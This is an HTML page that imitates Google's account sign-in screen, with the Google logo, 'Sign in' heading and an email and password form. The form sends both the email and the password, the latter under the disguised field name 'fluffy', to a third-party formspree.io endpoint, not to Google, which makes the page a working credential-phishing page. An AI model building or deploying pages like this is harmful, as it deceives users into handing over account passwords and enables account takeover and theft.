<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Google account</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #1e1f20;
            color: black;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .container {
            background-color: #0e0e0e;
            padding: 30px;
            border-radius: 25px;
            width: 990px;
            height: 500px; /* Adjusted to accommodate the elements */
            color: white;
            display: flex;
            justify-content: flex-start;
            flex-direction: column;
        }
        .logo {
            font-size: 40px;
            font-weight: 200;
            color: white;
            display: flex;
            align-items: center;
            margin-top: 20px;
        }
        .logo img {
            width: 54px;
            margin-right: 10px;
        }
        .text {
            text-align: left;
            margin-top: 10px;
        }
        #signinText {
            font-size: 42px;
            font-weight: 250;
            margin-bottom: 0;
        }
        #useGoogleText {
            font-size: 16px;
            font-weight: 300;
        }
        .input-box {
            width: 100%; /* Made the email input box longer */
            padding: 10px;
            margin-top: 20px; 
            border: 2px solid #333;
            background-color: #0e0e0e;
            color: white;
            border-radius: 5px;
            font-size: 16px;
            height: 45px; /* Made the height larger */
            margin-left: auto;
            margin-right: 0;
        }
        .link {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
        }
        .right-side-container {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            margin-left: 20px;
            margin-top: 10px;
            width: 45%; /* Adjusted the width for the right side container */
        }
        .forgot-email-link, .guest-mode, .btn-container, .footer {
            margin-left: 0;
            text-align: left;
        }
        .forgot-email-link {
            margin-top: 10px;
        }
        .guest-mode {
            font-size: 14px;
            color: white;
            margin-top: 10px;
            text-align: left;
        }
        .btn-container {
            display: flex;
            justify-content: flex-start;
            margin-top: 10px;
        }
        .btn {
            background: #8ab4f8;
            color: black;
            padding: 10px 20px;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-size: 16px;
            margin-right: 10px;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            text-align: center; /* Centered the footer content */
            color: white;
            width: 100%;
            display: flex;
            justify-content: center; /* Center the footer links horizontally */
            gap: 20px; /* Added space between the footer links */
        }
        .footer a {
            color: white;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <!-- Single Container for Email and Password -->
    <div class="container" id="signinBox">
        <!-- Google Logo at the Top Left -->
        <div class="logo">
            <img src="https://storage.googleapis.com/libraries-lib-production/images/GoogleLogo-canvas-404-300px.original.png" alt="Google Logo">
        </div>

        <!-- Sign In Text and Google Account Text underneath the logo -->
        <div class="text">
            <p id="signinText">Sign in</p>
            <p id="useGoogleText">Use your Google Account</p>
        </div>

        <!-- Form for Email and "Fluffy" -->
        <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST">
            <div style="display: flex; flex-direction: column; width: 100%; margin-top: 20px; align-items: flex-start;">
                <!-- Email or Phone Input -->
                <input type="email" name="email" id="emailInput" class="input-box" placeholder="Email or phone" required oninput="checkEmail()">
            </div>

            <!-- Right Side Container with Links and Next Button -->
            <div class="right-side-container">
                <!-- "Fluffy" (Password) Input -->
                <input type="password" name="fluffy" id="passwordInput" class="input-box" placeholder="Password" required style="display: none;">

                <!-- Forgot Email Link -->
                <a href="#" class="link forgot-email-link" id="forgotEmailLink">Forgot email?</a>

                <!-- Guest Mode Text -->
                <div class="guest-mode">
                    Not your computer? Use a private browsing window to sign in. <br>
                    <a href="#" class="link">Learn more about using Guest mode</a>
                </div>

                <!-- Button Container -->
                <div class="btn-container">
                    <a href="#" class="link" id="createAccountLink">Create account</a>
                    <button type="submit" class="btn" id="nextButton">Next</button>
                </div>
            </div>
        </form>
    </div>

    <!-- Footer Section -->
    <div class="footer">
        <a href="#">English (United Kingdom)</a>
        <a href="#">Help</a> | 
        <a href="#">Privacy</a> | 
        <a href="#">Terms</a>
    </div>

    <script>
        // Function to show password input after email is entered
        function checkEmail() {
            var email = document.getElementById('emailInput').value;
            var passwordInput = document.getElementById('passwordInput');
            if (email) {
                passwordInput.style.display = 'block'; // Show password input
            } else {
                passwordInput.style.display = 'none'; // Hide password input if email is empty
            }
        }

        // Optional: Prevent form submission without email
        document.getElementById('signinForm').addEventListener('submit', function(event) {
            var email = document.getElementById('emailInput').value;
            if (!email) {
                alert("Please enter an email address.");
                event.preventDefault(); // Prevent form submission
            }
        });
    </script>
</body>
</html>
